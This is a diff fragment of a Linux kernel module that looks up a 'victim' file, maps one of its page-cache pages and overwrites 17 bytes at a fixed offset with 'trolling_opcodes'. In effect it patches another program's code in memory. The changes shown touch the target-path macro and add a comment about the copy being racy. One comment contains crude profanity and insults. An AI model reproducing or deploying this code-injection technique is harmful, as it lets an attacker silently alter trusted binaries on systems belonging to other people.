@@ -23,7 +23,7 @@ int init_module(void)
   char* ptr;
   struct page* page;
   int count;
-  char* path = VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);///VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);
+  char* path = TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);///VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//TOSTRING(VICTIM_FILE);
 //  printk("path after stringify %d\n", linux); //stupid fucking macro nobody like you you cuck fuck you
 	struct inode* i = get_file_path(path);//
   if(!i){
@@ -82,7 +82,7 @@ int init_module(void)
   }
   map = kmap(page);
   ptr = (char*)map + pg_off(0x001111d4);
-  for(count = 0; count < 17; count++, ptr++){
+  for(count = 0; count < 17; count++, ptr++){  //it iterativly copies the opcodes. That is problematic with synchronous access.
     *ptr = trolling_opcodes[count];
   }
   kunmap(map);
